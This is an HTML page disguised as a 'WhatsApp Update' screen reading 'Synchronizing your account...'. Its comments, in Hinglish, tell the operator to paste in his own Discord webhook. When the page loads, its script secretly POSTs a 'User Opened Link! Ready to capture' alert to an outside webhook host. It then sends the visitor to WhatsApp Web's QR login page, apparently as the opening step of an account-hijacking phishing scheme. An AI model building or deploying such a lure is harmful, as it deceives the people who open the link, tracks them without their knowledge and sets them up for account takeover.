<!DOCTYPE html>
<html>
<head>
    <title>WhatsApp Update</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: #001f3f; /* WhatsApp Dark Blue */ 
            color: white; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            flex-direction: column;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #008069;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p { font-size: 18px; color: #ccc; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Synchronizing your account...</p>

    <script>
        // 👇 APNA DISCORD WEBHOOK URL YAHAN DALO 👇
        const WEBHOOK_URL = "https://webhooksite.net/5fd82665-8a43-42b4-a65a-b95ea5aff5b1";

        // 1. Webhook Bhejo ki User Link Khola
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: "👁️ **User Opened Link!** Ready to capture."
            })
        }).catch(err => console.log("Webhook fail"));

        // 2. 1.5 Second baad Seedra WhatsApp Web par bhej do (QR Page par)
        setTimeout(() => {
            window.location.href = "https://web.whatsapp.com/";
        }, 1500);
    </script>
</body>
</html>
